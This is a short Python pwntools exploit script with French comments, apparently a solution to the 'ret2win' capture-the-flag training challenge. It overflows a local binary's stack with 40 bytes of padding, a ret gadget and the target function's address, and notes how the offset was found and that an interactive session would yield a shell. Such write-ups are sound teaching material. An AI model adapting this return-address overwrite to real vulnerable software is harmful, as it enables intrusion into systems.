from pwn import *

context.bits = 64

ret = p64(0x400755)
# Adresse d'un gadget "ret" trouvée en désassemblant quelques fonctions
# Choisie arbitrairement parmi plusieurs
# Nécessaire parce que la pile est corrompue et que l'adresse de retour de la fonction courante est cassée sinon

ret2win = p64(0x400756)
# Adresse trouvée dans GDB avec un simple "p ret2win"

payload = b'A' * 40 + ret + ret2win
# Procédure qui a abouti à ce chiffre de 40 : 
#     msf-pattern_create -l 500
#     (gdb) run < cyclic500.txt
#     (gdb) bt
#     msf-pattern_offset -q 0x35624134 -l 500

p = process("./ret2win")

p.sendline(payload)
print(p.recvall().decode())
# En mettant un "p.interactive()" à la place on aurait le shell avec le system() de la fonction
# Ce n'est pas ce qu'on souhaite dans ce cas
